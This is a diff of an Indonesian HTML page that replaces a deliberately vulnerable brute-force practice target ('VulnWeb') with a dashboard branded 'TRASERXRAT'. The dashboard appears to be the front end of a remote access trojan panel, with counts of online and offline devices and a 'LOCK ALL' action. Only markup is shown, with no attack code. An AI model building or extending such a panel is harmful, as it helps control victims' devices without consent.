@@ -2,19 +2,158 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VulnWeb - Target Latihan</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>TRASERXRAT</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<div class="container">
-    <h1>VULN WEB</h1>
-    <p class="subtitle">Target latihan brute force</p>
 
-    <a href="login.html" class="btn">🔐 Login Username + Password</a>
-    <a href="pin.html" class="btn">🔢 Login PIN 4-Digit</a>
+<!-- ============ HEADER ============ -->
+<header class="cyber-header">
+  <div class="cyber-header-left">
+    <div class="cyber-logo">
+      <i class="fa-solid fa-shield-halved"></i>
+    </div>
+    <div>
+      <h1 class="cyber-title">TRASERXRAT</h1>
+      <p class="cyber-subtitle">
+        <span class="cyber-dot"></span> System Online
+      </p>
+    </div>
+  </div>
+  <button class="cyber-btn-icon" onclick="loadStats()">
+    <i class="fa-solid fa-rotate"></i>
+  </button>
+</header>
 
-    <p class="note">Server ini sengaja rentan.<br>Buat latihan authorized testing only.</p>
-</div>
+<!-- ============ SCAN LINE ============ -->
+<div class="cyber-scanline"></div>
+
+<!-- ============ INFO AKUN ============ -->
+<section class="cyber-card cyber-card-account">
+  <div class="cyber-card-header">
+    <i class="fa-solid fa-user-astronaut"></i>
+    <span>AKUN SAYA</span>
+    <div class="cyber-card-line"></div>
+  </div>
+  <div class="cyber-account-grid">
+    <div class="cyber-account-item">
+      <div class="cyber-label">USERNAME</div>
+      <div class="cyber-value" id="accUser">-</div>
+    </div>
+    <div class="cyber-account-item">
+      <div class="cyber-label">ROLE</div>
+      <div class="cyber-value cyber-value-neon" id="accRole">-</div>
+    </div>
+    <div class="cyber-account-item">
+      <div class="cyber-label">STATUS</div>
+      <div class="cyber-value" id="accStatus">-</div>
+    </div>
+    <div class="cyber-account-item">
+      <div class="cyber-label">EXPIRED</div>
+      <div class="cyber-value cyber-value-warning" id="accExpired">-</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ STATISTIK ============ -->
+<section class="cyber-card">
+  <div class="cyber-card-header">
+    <i class="fa-solid fa-chart-line"></i>
+    <span>STATISTIK</span>
+    <div class="cyber-card-line"></div>
+  </div>
+  <div class="cyber-stats-grid">
+    <div class="cyber-stat">
+      <i class="fa-solid fa-mobile-screen cyber-stat-icon"></i>
+      <div class="cyber-stat-num" id="totalDevice">0</div>
+      <div class="cyber-stat-lbl">TOTAL</div>
+    </div>
+    <div class="cyber-stat cyber-stat-green">
+      <i class="fa-solid fa-wifi cyber-stat-icon"></i>
+      <div class="cyber-stat-num" id="onlineDevice">0</div>
+      <div class="cyber-stat-lbl">ONLINE</div>
+    </div>
+    <div class="cyber-stat cyber-stat-red">
+      <i class="fa-solid fa-plug-circle-xmark cyber-stat-icon"></i>
+      <div class="cyber-stat-num" id="offlineDevice">0</div>
+      <div class="cyber-stat-lbl">OFFLINE</div>
+    </div>
+    <div class="cyber-stat cyber-stat-yellow">
+      <i class="fa-solid fa-ban cyber-stat-icon"></i>
+      <div class="cyber-stat-num" id="bannedDevice">0</div>
+      <div class="cyber-stat-lbl">BANNED</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ QUICK ACTION ============ -->
+<section class="cyber-card">
+  <div class="cyber-card-header">
+    <i class="fa-solid fa-bolt"></i>
+    <span>QUICK ACTION</span>
+    <div class="cyber-card-line"></div>
+  </div>
+  <div class="cyber-action-grid">
+    <button class="cyber-action" onclick="window.location.href='devices.html'">
+      <i class="fa-solid fa-mobile-screen-button"></i>
+      <span>DEVICE</span>
+    </button>
+    <button class="cyber-action cyber-action-danger" onclick="lockAll()">
+      <i class="fa-solid fa-lock"></i>
+      <span>LOCK ALL</span>
+    </button>
+    <button class="cyber-action cyber-action-purple" onclick="window.location.href='tools.html'">
+      <i class="fa-solid fa-screwdriver-wrench"></i>
+      <span>TOOLS</span>
+    </button>
+    <button class="cyber-action cyber-action-pink" onclick="window.location.href='report.html'">
+      <i class="fa-solid fa-bug"></i>
+      <span>REPORT</span>
+    </button>
+  </div>
+</section>
+
+<!-- ============ AKTIVITAS ============ -->
+<section class="cyber-card">
+  <div class="cyber-card-header">
+    <i class="fa-solid fa-wave-square"></i>
+    <span>AKTIVITAS</span>
+    <div class="cyber-card-line"></div>
+  </div>
+  <div id="activityList" class="cyber-activity">
+    <div class="cyber-loading">
+      <i class="fa-solid fa-spinner fa-spin"></i> Memuat...
+    </div>
+  </div>
+</section>
+
+<!-- ============ BOTTOM NAV ============ -->
+<nav class="cyber-nav">
+  <a href="home.html" class="cyber-nav-item active">
+    <i class="fa-solid fa-house"></i>
+    <span>HOME</span>
+  </a>
+  <a href="devices.html" class="cyber-nav-item">
+    <i class="fa-solid fa-mobile-screen-button"></i>
+    <span>DEVICE</span>
+  </a>
+  <a href="tools.html" class="cyber-nav-item">
+    <i class="fa-solid fa-screwdriver-wrench"></i>
+    <span>TOOLS</span>
+  </a>
+  <a href="update.html" class="cyber-nav-item">
+    <i class="fa-solid fa-rotate"></i>
+    <span>UPDATE</span>
+  </a>
+  <a href="report.html" class="cyber-nav-item">
+    <i class="fa-solid fa-bug"></i>
+    <span>REPORT</span>
+  </a>
+</nav>
+
+<script src="firebase.js"></script>
+<script src="home.js"></script>
 </body>
 </html>
